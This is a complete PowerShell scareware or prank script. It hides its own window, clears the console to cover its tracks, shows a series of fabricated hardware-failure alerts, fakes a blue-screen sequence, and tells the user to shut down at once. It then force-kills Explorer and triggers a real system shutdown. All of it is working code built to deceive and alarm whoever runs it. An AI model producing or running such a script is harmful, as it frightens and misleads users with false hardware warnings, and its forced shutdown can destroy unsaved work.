# Clear terminal history (hides evidence that script was executed)
Clear-Host

# Hides the PowerShell window immediately
$psWindow = (Get-Process -Id $PID).MainWindowHandle

# Check if the WinAPI type is already defined
if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    }
"@
}

# Hide PowerShell Window
[WinAPI]::ShowWindow($psWindow, 0)

# Fake delay to make it feel real
Start-Sleep -Seconds 15

# Function to show fake error messages
function Show-Error {
    param (
        [string]$message,
        [string]$title
    )
    [WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
}

# List of believable errors to display randomly
$errors = @(
    "Critical hardware failure: Motherboard voltage instability detected!",
    "BIOS checksum error: Possible short circuit on mainboard!",
    "Memory read/write failure: Data corruption detected in sector 0x1A3F",
    "System temperature alert: CPU and VRM running at dangerous levels!",
    "PCIe Bus Error: High-speed link failure detected!",
    "Kernel panic: Unexpected memory dump detected!",
    "Fatal hardware damage: Water intrusion detected in DIMM slot!",
    "Component mismatch: CPU registers do not match expected values!",
    "Voltage irregularity: Sudden power loss may cause permanent damage!",
    "BIOS boot table corruption: Recovery options limited!",
    "Chipset failure: Data bus overload detected!"
)

# Display errors at random intervals
for ($i = 0; $i -lt 6; $i++) {
    $errorMessage = $errors | Get-Random
    Show-Error $errorMessage "SYSTEM CRITICAL ERROR"
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 12)  # Random wait time
}

# Fake BSOD Sequence (PowerShell reappears)
[WinAPI]::ShowWindow($psWindow, 5)

# Fake blue screen simulation
Start-Process "cmd.exe" -ArgumentList "/c color 1F && mode con cols=80 lines=25 && echo A critical system error has occurred... && timeout 10" -NoNewWindow -Wait

# Simulated system instability (flashing console messages)
for ($i=0; $i -lt 4; $i++) {
    Start-Process "cmd.exe" -ArgumentList "/c color 4F && echo Memory corruption spreading! && timeout 1" -NoNewWindow -Wait
    Start-Process "cmd.exe" -ArgumentList "/c color 1F && echo CRITICAL FAILURE! Kernel Error!" -NoNewWindow -Wait
}

# Final warning before fake shutdown
Show-Error "Operating system integrity compromised! Immediate shutdown required to prevent hardware damage!" "FATAL SYSTEM ERROR"

# Kill Explorer (makes the screen go blank)
Stop-Process -Name explorer -Force
Start-Sleep -Seconds 5

# Fake shutdown
Start-Process "shutdown.exe" -ArgumentList "/s /t 5 /c 'Critical system instability detected! Immediate power off required!'" -NoNewWindow -Wait
